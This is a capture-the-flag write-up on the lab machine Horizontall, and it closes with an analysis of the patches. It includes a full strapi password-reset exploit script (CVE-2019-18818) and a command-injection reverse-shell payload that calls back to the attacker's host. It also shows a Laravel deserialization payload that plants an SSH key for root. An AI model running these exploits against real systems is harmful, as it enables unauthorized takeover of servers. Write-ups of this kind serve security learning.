---
title: HTB: Horizontall
url: https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html
date: 2022-02-05T14:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-horizontall, nmap, feroxbuster, source-code, vhosts, strapi, cve-2019-18818, cve-2019-19609, command-injection, burp, burp-repeater, laravel, phpggc, deserialization, oscp-like-v2
---

![Horizontall](https://0xdfimages.gitlab.io/img/horizontall-cover.png)

Horizonatll was built around vulnerabilities in two web frameworks. First there’s discovering an instance of strapi, where I’ll abuse a CVE to reset the administrator’s password, and then use an authenticated command injection vulnerability to get a shell. With a foldhold on the box, I’ll examine a dev instance of Laravel running only on localhost, and manage to crash it and leak the secrets. From there, I can do a deserialization attack to get execution as root. In Beyond Root, I’ll dig a bit deeper on the strapi CVEs and how they were patched.

## Box Info

| Name | [Horizontall](https://hackthebox.com/machines/horizontall)  [Horizontall](https://hackthebox.com/machines/horizontall) [Play on HackTheBox](https://hackthebox.com/machines/horizontall) |
| --- | --- |
| Release Date | [28 Aug 2021](https://twitter.com/hackthebox_eu/status/1430545011473620995) |
| Retire Date | 05 Feb 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Horizontall |
| Radar Graph | Radar chart for Horizontall |
| First Blood User | 00:14:24[celesian celesian](https://app.hackthebox.com/users/114435) |
| First Blood Root | 00:33:37[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| Creator | [wail99 wail99](https://app.hackthebox.com/users/4005) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22) and two HTTP servers (80, 1337):

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.105
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 20:54 EDT
Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.105
Host is up (0.10s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 103.44 seconds
oxdf@hacky$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.11.105
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-03 20:56 EDT
Nmap scan report for 10.10.11.105
Host is up (0.090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.11 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 18.04 Bionic.

### Website - TCP 80

#### Site

Visiting by IP just redirects to `horizontall.htb`, which I’ll add to my local `/etc/hosts` file. Now the site is for a website builder:

[![image-20210803210020501](https://0xdfimages.gitlab.io/img/image-20210803210020501.png)](https://0xdfimages.gitlab.io/img/image-20210803210020501.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20210803210020501.png)

None of the links on the page work, and the contact us form at the bottom doesn’t submit.

#### Tech Stack

The HTTP response headers show it is NGINX, but not much else. Trying to visit `index.php` returns 404 not found.

Viewing the page source shows it just as one line, and putting it through a [beautifier](https://beautifytools.com/html-beautifier.php) results in:

```

<!DOCTYPE html>
<html lang="">

<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="/favicon.ico">
	<title>horizontall</title>
	<link href="/css/app.0f40a091.css" rel="preload" as="style">
	<link href="/css/chunk-vendors.55204a1e.css" rel="preload" as="style">
	<link href="/js/app.c68eb462.js" rel="preload" as="script">
	<link href="/js/chunk-vendors.0e02b89e.js" rel="preload" as="script">
	<link href="/css/chunk-vendors.55204a1e.css" rel="stylesheet">
	<link href="/css/app.0f40a091.css" rel="stylesheet">
</head>

<body>
	<noscript><strong>We're sorry but horizontall doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript>
	<div id="app"></div>
	<script src="/js/chunk-vendors.0e02b89e.js"></script>
	<script src="/js/app.c68eb462.js"></script>
</body>

</html>

```

This limited HTML with JavaScript that generates the page is common, especially with frameworks that run JavaScript on the server as well, such as NodeJS.

Firefox developer tools shows the same JS files:

![image-20210728145254757](https://0xdfimages.gitlab.io/img/image-20210728145254757.png)

The JavaScript in `app.c68eb462.js` is minified, but tossing it into a [beautifier](https://beautifytools.com/javascript-beautifier.php) returns 654 lines of JavaScript. Glancing through it, this section jumped out because it reveals a subdomain:

```

methods: {
    getReviews: function() {
        var t = this;
        r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s) {
            return t.reviews = s.data
        }))
    }
}

```

#### Directory and Subdomain Brute Forces

Before checking out the other subdomain, I’ll get some brute forcing running in the background.

I’ll run `feroxbuster` against the site, but it doesn’t find anything:

```

oxdf@hacky$ feroxbuster -u http://horizontall.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://horizontall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       13w      194c http://horizontall.htb/js
301        7l       13w      194c http://horizontall.htb/css
301        7l       13w      194c http://horizontall.htb/img
[####################] - 58s   119996/119996  0s      found:3       errors:0      
[####################] - 58s    29999/29999   515/s   http://horizontall.htb
[####################] - 58s    29999/29999   516/s   http://horizontall.htb/js
[####################] - 58s    29999/29999   515/s   http://horizontall.htb/css
[####################] - 58s    29999/29999   515/s   http://horizontall.htb/img

```

I’ll also want to check for other virtual hosts using `wfuzz` but it doesn’t find anything either:

```

oxdf@hacky$ wfuzz --hh 194 -u http://horizontall.htb -H "Host: FUZZ.horizontal.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://horizontall.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                    
=====================================================================

Total time: 191.0997
Processed Requests: 19966
Filtered Requests: 19966
Requests/sec.: 104.4794

```

### api-prod.horizontall.htb

#### API

Just visiting `api-prod.horizontall.htb` just returns a page that says Welcome:

![image-20210802130528194](https://0xdfimages.gitlab.io/img/image-20210802130528194.png)

The request in the JavaScript was to `api-prod.horizontall.htb/reviews`. Visiting that returns JSON, which FireFox will pretty print:

![image-20210802130601072](https://0xdfimages.gitlab.io/img/image-20210802130601072.png)

#### Endpoints

Not seeing much I can do with that `/reviews` endpoint, I’ll fuzz for additional ones. I’ll use `ferobuster` again. I like to use subdomain wordlists as they track pretty closely to the kinds of things I might expect as an API route. It finds two additional endpoints:

```

oxdf@hacky$ feroxbuster -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api-prod.horizontall.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200       16l      101w      854c http://api-prod.horizontall.htb/admin
403        1l        1w       60c http://api-prod.horizontall.htb/users
200        1l       21w      507c http://api-prod.horizontall.htb/reviews
[####################] - 41s    19964/19964   0s      found:3       errors:0      
[####################] - 41s    19964/19964   485/s   http://api-prod.horizontall.htb

```

`/users` returns 403 Forbidden, so not much I can do with that for now.

#### /admin

Visiting `/admin` presents a login form for [strapi](https://strapi.io/), which defines itself as “the leading open-source headless CMS. It’s 100% JavaScript, fully customizable and developer-first.”

![image-20210802131003331](https://0xdfimages.gitlab.io/img/image-20210802131003331.png)

## Shell as strapi

### Exploit Identification

Some Googling for “strapi exploit” leads to a few things of interest. I first found CVE-2019-19609, which is an authenticated RCE exploit, nicely explainted [here](https://bittherapy.net/post/strapi-framework-remote-code-execution/). That’ll be useful if I can get authenticated.

There’s also CVE-2019-18818, which is allows resetting the admin password for strapi. [This post](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/) has a Python exploit script. It also shows how to check the strapi version at `/admin/strapiVersion`:

```

oxdf@hacky$ curl http://api-prod.horizontall.htb/admin/strapiVersion
{"strapiVersion":"3.0.0-beta.17.4"}

```

Both of the vulnerabilities above exist in this version.

### Change Admin Password

First I’ll use CVE-2019-18818 to change the admin password using the script from the post above:

```

import requests    
import sys    
import json    
     
args=sys.argv    
     
if len(args) < 4:    
    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))    
    exit(-1)    
     
email = args[1]    
url = args[2]    
new_password =  args[3]    
     
s  =  requests.Session()    
     
version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)    
     
print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))    
     
#Request password reset    
print("[*] Sending password reset request...")    
reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}    
s.post("{}/".format(url), json=reset_request)    
     
#Reset password to    
print("[*] Setting new password...")    
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}    
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)    
     
print("[*] Response:")    
print(str(r.content))   

```

Basically it gets the version, then submits a POST to `/admin/plugins/user-permissions/auth/reset-password`, and then another POST to `/admin/auth/reset-password`. I’ll give it a try. I thought I might need to guess the admin email address, but it turns out that doesn’t matter (I’ll look at the script and the responses in [Beyond Root](#cve-2019-18818)).

```

oxdf@hacky$ python3 cve-2019-18818.py randomjunk http://api-prod.horizontall.htb 0xdf0xdf
[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
[*] Sending password reset request...
[*] Setting new password...
[*] Response:
b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjI3OTI1NzY0LCJleHAiOjE2MzA1MTc3NjR9.KKiaGhh3vsqtsgoqxliwiQt-8SLpQem6L5LDs0ks34o","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'

```

The response gives the admin’s username, which I can use to log in at `/admin`:

![image-20210802134604970](https://0xdfimages.gitlab.io/img/image-20210802134604970.png)

### RCE

#### Proof of Concept

Now that I’m authenticated, I’ll turn back to CVE-2019-19609. Looking at the [blog post](https://bittherapy.net/post/strapi-framework-remote-code-execution/), it’s a JSON POST request to `/admin/plugins/install` with command injection in the `plugin` parameter. They show it as a `curl` command:

```

curl -i -s -k -X $'POST' -H $'Host: localhost:1337' -H $'Authorization: Bearer [jwt]' -H $'Content-Type: application/json' -H $'Origin: http://localhost:1337' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f)\",\"port\":\"1337\"}' $'http://localhost:1337/admin/plugins/install'

```

That seems easier in Burp. I’ll visit `http://api-prod.horizontall.htb/admin/plugins/install`, and it returns a page that’s kinda blank:

![image-20210802140217813](https://0xdfimages.gitlab.io/img/image-20210802140217813.png)

I think this endpoint is really only expecting POSTs. I’ll find that request, send it to Repeater, and right-click and change request method. I’ll need to change the `Content-Type` header, and make sure to add (if it’s not there) a `Authorization` header, which I can find looking through the requests I’ve made already. It looks like this:

[![image-20210802140610705](https://0xdfimages.gitlab.io/img/image-20210802140610705.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20210802140610705.png)

I’ll start `tcpdump` listening for ICMP traffic, and when I hit send, it hangs for a second, and then returns. At `tcpdump`:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
14:05:06.215442 IP 10.10.10.125 > 10.10.14.6: ICMP echo request, id 2715, seq 1, length 64
14:05:06.215471 IP 10.10.14.6 > 10.10.10.125: ICMP echo reply, id 2715, seq 1, length 64

```

That’s RCE. I’ll look at how they patched this in [Beyond Root](#cve-2019-19609).

#### Shell

To make that return a reverse shell, I’ll use the reverse shell payload used in the blog post:

```

{"plugin": "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 443 >/tmp/f)", "port": "1337"}

```

On sending, with `nc` listening on 443, it returns a shell:

```

oxdf@hacky$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.125] 46108
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)

```

I’ll upgrade the shell using the `script` trick:

```

$ script /dev/null -c bash
Script started, file is /dev/null
strapi@horizontall:~/myapi$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
strapi@horizontall:~/myapi$ 

```

There’s one user on the box, developer, and I can read `user.txt` from their home dir:

```

strapi@horizontall:/home/developer$ cat user.txt
e0f97f93************************

```

## Shell as root

### Enumeration

#### Identify Service

In the developer home directory there’s also a folder, `myproject`, that I can’t access:

```

strapi@horizontall:/home/developer$ ls -l
total 68
-rw-rw----  1 developer developer 58460 May 26 11:59 composer-setup.php
drwx------ 12 developer developer  4096 May 26 12:21 myproject
-r--------  1 developer developer    33 Jun  1 13:59 user.txt

```

The existence of a `composer-setup.php` file suggests there’s some kind of PHP site in use here.

Looking at the `netstat`, there’s the site on 80, and a NodeJS side on 1337. There’s also MySQL on 3306 (which makes sense). But there’s also something on 8000:

```

strapi@horizontall:/home/developer$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1595/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -

```

The service on 8000 is an HTTP server:

```

strapi@horizontall:/home/developer$ curl -I 127.0.0.1:8000              
HTTP/1.1 200 OK
Host: 127.0.0.1:8000
Date: Mon, 02 Aug 2021 18:16:18 GMT
Connection: close
X-Powered-By: PHP/7.4.18
Content-Type: text/html; charset=UTF-8
Cache-Control: no-cache, private
Date: Mon, 02 Aug 2021 18:16:18 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6Im5QaytzNHJqUkMwb1NCWlBYdFVkbnc9PSIsInZhbHVlIjoiaHRZWWRtaWh0SHpFZnNKL1kxS3BSbUxTVlRBNXk3SFlSdk1OZnNVM0kvTm9XQXdSUTV4VG5reGduY0NGdENIek9ocHgzVXJKOFhJa0k2VzlzUnJ5bXJOK1hMNEtJQ1R6cUZ1NFVwTUxkTHpmVjZTZDlwcXNXR1I2QVg1WWx5b2QiLCJtYWMiOiJlZjY3MjliZTRkODU5OTMwNGQxYTdhNmM5NzUxNzg3YjQ1ODBmMWExMTgyNWQ1ZTZlZDY0MmU5OWZhZTM5MWM0In0%3D; expires=Mon, 02-Aug-2021 20:16:18 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IjhUbXZ2UXNnNm5UZ1Rvd24zbzB3WVE9PSIsInZhbHVlIjoiNHE3OFFXTzJ1akY2Vms3L3E5U2JRRzVBZW0veUlwNHYzTW9rNERsQkhzS05OdEEwa1RaSUxxZEZ6eWhJSE45OEFLYVJIK1lsN1U0cUlIV0JrUFA1QzZ3RXBPcVVHVVJzNEFvVWM0QThJRXNpZElQVTdGTllpVDVRMzBMTVQ4VlciLCJtYWMiOiIzYjZjZTY5NDM0Nzk4MmU2N2U4ZTUxN2ViYzI5ZjA2MjllYzE3OWZlZTFkZWVjZmQyYTYwMDAzNjViYWUzMWI5In0%3D; expires=Mon, 02-Aug-2021 20:16:18 GMT; Max-Age=7200; path=/; httponly; samesite=lax

```

And based on the response and the cookies, it looks like Laravel, a PHP framework.

#### Access Page

the strapi user’s home directory is `/opt/strapi`, I can still add a `.ssh` directory and an `authorized_keys` file. I’ll add my key:

```

strapi@horizontall:~$ mkdir .ssh
strapi@horizontall:~$ cd .ssh/
strapi@horizontall:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> authorized_keys 

```

Now I can SSH to the box, and use that to tunnel port 8000 on my localbox to port 8000 on Horizontall:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen strapi@10.10.10.125 -L 8000:localhost:8000
...[snip]...
$

```

#### Page

Visiting the page with FireFox works now, but it’s just the default Laravel page:

![image-20210802142559157](https://0xdfimages.gitlab.io/img/image-20210802142559157.png)

Running `feroxbuster` against it didn’t return anything. Eventually, knowing there had to be some reason for this site existing, I tried `gobuster`, and it found `/profiles`:

```

oxdf@hacky$ gobuster dir -u http://127.0.0.1:8000 -w /usr/share/seclists/Discovery/W
eb-Content/raft-medium-directories.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:8000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/08/02 14:27:16 Starting gobuster in directory enumeration mode===============================================================
/profiles             (Status: 500) [Size: 616206]
...[snip]...

```

Visiting `/profiles` shows a crash:

![image-20210802143547930](https://0xdfimages.gitlab.io/img/image-20210802143547930.png)

But not only does it crash, but it returns a bunch of information. This is Laravel debug mode.

### Laravel Debug Mode RCE

#### Exploit

Goolgling for “laravel debug mode exploit”, the first hit is [this post](https://www.ambionics.io/blog/laravel-debug-rce):

![image-20210802143923384](https://0xdfimages.gitlab.io/img/image-20210802143923384.png)

There’s a PHP deserialization exploit that gets remote code execution against Laravel debug mode. The blog post is very detailed, and at the end, there’s a link to their [GitHub containing the exploit](https://github.com/ambionics/laravel-exploits). I’ll also need `phpggc`, available [here](https://github.com/ambionics/phpggc), to generate the deserialization payload.

#### POC

To show it works, I’ll start with the `id` command. First, I’ll generate the payload using `phpggc`:

```

oxdf@hacky$ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o id.phar --fast-destruct monolog/rce1 system id

```

This creates a serialized PHP file, which I saved as `id.phar`. The file looks like a PHP object:

```

oxdf@hacky$ xxd id.phar 
00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  <?php __HALT_COM
00000010: 5049 4c45 5228 293b 203f 3e0d 0abd 0100  PILER(); ?>.....
00000020: 0002 0000 0011 0000 0001 0000 0000 0066  ...............f
00000030: 0100 0061 3a32 3a7b 693a 373b 4f3a 3332  ...a:2:{i:7;O:32
00000040: 3a22 4d6f 6e6f 6c6f 675c 4861 6e64 6c65  :"Monolog\Handle
00000050: 725c 5379 736c 6f67 5564 7048 616e 646c  r\SyslogUdpHandl
00000060: 6572 223a 313a 7b73 3a39 3a22 002a 0073  er":1:{s:9:".*.s
00000070: 6f63 6b65 7422 3b4f 3a32 393a 224d 6f6e  ocket";O:29:"Mon
00000080: 6f6c 6f67 5c48 616e 646c 6572 5c42 7566  olog\Handler\Buf
00000090: 6665 7248 616e 646c 6572 223a 373a 7b73  ferHandler":7:{s
000000a0: 3a31 303a 2200 2a00 6861 6e64 6c65 7222  :10:".*.handler"
000000b0: 3b72 3a33 3b73 3a31 333a 2200 2a00 6275  ;r:3;s:13:".*.bu
000000c0: 6666 6572 5369 7a65 223b 693a 2d31 3b73  fferSize";i:-1;s
000000d0: 3a39 3a22 002a 0062 7566 6665 7222 3b61  :9:".*.buffer";a
000000e0: 3a31 3a7b 693a 303b 613a 323a 7b69 3a30  :1:{i:0;a:2:{i:0
000000f0: 3b73 3a32 3a22 6964 223b 733a 353a 226c  ;s:2:"id";s:5:"l
00000100: 6576 656c 223b 4e3b 7d7d 733a 383a 2200  evel";N;}}s:8:".
00000110: 2a00 6c65 7665 6c22 3b4e 3b73 3a31 343a  *.level";N;s:14:
00000120: 2200 2a00 696e 6974 6961 6c69 7a65 6422  ".*.initialized"
00000130: 3b62 3a31 3b73 3a31 343a 2200 2a00 6275  ;b:1;s:14:".*.bu
00000140: 6666 6572 4c69 6d69 7422 3b69 3a2d 313b  fferLimit";i:-1;
00000150: 733a 3133 3a22 002a 0070 726f 6365 7373  s:13:".*.process
00000160: 6f72 7322 3b61 3a32 3a7b 693a 303b 733a  ors";a:2:{i:0;s:
00000170: 373a 2263 7572 7265 6e74 223b 693a 313b  7:"current";i:1;
00000180: 733a 363a 2273 7973 7465 6d22 3b7d 7d7d  s:6:"system";}}}
00000190: 693a 373b 693a 373b 7d05 0000 0064 756d  i:7;i:7;}....dum
000001a0: 6d79 0400 0000 af3f 0861 0400 0000 0c7e  my.....?.a.....~
000001b0: 7fd8 a401 0000 0000 0000 0800 0000 7465  ..............te
000001c0: 7374 2e74 7874 0400 0000 af3f 0861 0400  st.txt.....?.a..
000001d0: 0000 0c7e 7fd8 a401 0000 0000 0000 7465  ...~..........te
000001e0: 7374 7465 7374 d9ed c52a 4925 ac5f 19e8  sttest...*I%._..
000001f0: 09c7 8a82 9975 1ffa 2a30 0200 0000 4742  .....u..*0....GB
00000200: 4d42

```

The command, `id`, is on line 0x000000f0.

Now I’ll run the Python script, passing it the serialized payload:

```

oxdf@hacky$ python3 /opt/laravel-exploits/laravel-ignition-rce.py http://127.0.0.1:8000 id.phar 
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
--------------------------
uid=0(root) gid=0(root) groups=0(root)
--------------------------
+ Logs cleared

```

It works, and is running as root!

#### Shell

I’ll regenerate a new payload, this time creating `/root/.ssh` if it doesn’t exist, and then writing my SSH key to `authorized_keys`:

```

oxdf@hacky$ php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys'

```

Run the exploit again:

```

oxdf@hacky$ python3 /opt/laravel-exploits/laravel-ignition-rce.py http://127.0.0.1:8000 ssh.phar
+ Log file: /home/developer/myproject/storage/logs/laravel.log
+ Logs cleared
+ Successfully converted to PHAR !
+ Phar deserialized
Exploit succeeded
+ Logs cleared

```

I’m now able to connect as root:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.10.125
...[snip]...
root@horizontall:~# 

```

And grab the flag:

```

root@horizontall:~# cat root.txt
6bf8cc06************************

```

## Beyond Root

### CVE-2019-18818

#### Exploit Script

I wanted to better understand this exploit and how it used the input email address (or didn’t). On first looking at the help, it looks like I need to know the admin email:

```

oxdf@hacky$ python3 cve-2019-18818.py 
Usage: cve-2019-18818.py <admin_email> <url> <new_password>

```

As I discovered above, putting anything into that field seemed to work. Looking most closely at the script, it makes three requests. The first is `/admin/strapiVersion` to see if it’s a vulnerable version.

The second is to `/admin/plugins/user-permissions/auth/reset-password`:

```

#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
s.post("{}/".format(url), json=reset_request)

```

This is where the email is used. I noted above that just putting random junk in there works.

The third request is to `/admin/auth/reset-password`, and the key thing is to note that the `code` parameter is an empty dictionary:

```

#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit

```

I’ll add a this line to the top of the exploit to send all the requests through Burp:

```

s.proxies.update({"http": "http://127.0.0.1:8080"})

```

The third request looks like:

```

POST /admin/auth/reset-password HTTP/1.1
Host: api-prod.horizontall.htb
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 68
Content-Type: application/json

{"code": {}, "password": "aaaaaa", "passwordConfirmation": "aaaaaa"}

```

So the exploit is in sending an empty dictionary where the reset code should be.

At least for Horizontall, the first two requests were not needed at all. I reset the box, and just replayed this request from repeater:

![image-20220202161658349](https://0xdfimages.gitlab.io/img/image-20220202161658349.png)

It worked, and I could login.

#### The Patch

The pull request to fix this issue in strapi is [here](https://github.com/strapi/strapi/pull/4443). Viewing the changed files, it only changes one line in each of two files:

![image-20220202161924658](https://0xdfimages.gitlab.io/img/image-20220202161924658.png)

In both endpoints, it’s taking the code parameter and wrapping it in ``${ }``, which forces the object to be a string. Without that wrapping, the client is able to abuse the query with something like `{"$gt": 0}` or even a `{}`, which returns a match.

### CVE-2019-19609

This remote code execution vulnerability is a command injection. Looking at the [pull request](https://github.com/strapi/strapi/pull/4636) that fixes it, there are two added checks, one in `installPlugin` and the other in `uninstallPlugin`, both the same code:

![image-20220202173440715](https://0xdfimages.gitlab.io/img/image-20220202173440715.png)

Before the addition, it would get the plugin name from the request body, and then run `npm run strapi -- install [plugin name]`. This has command injection written all over it. The solution is to make sure that the only characters in the plugin name are alphanumeric or dash and underscore. Without other characters, it’s impossible to command inject.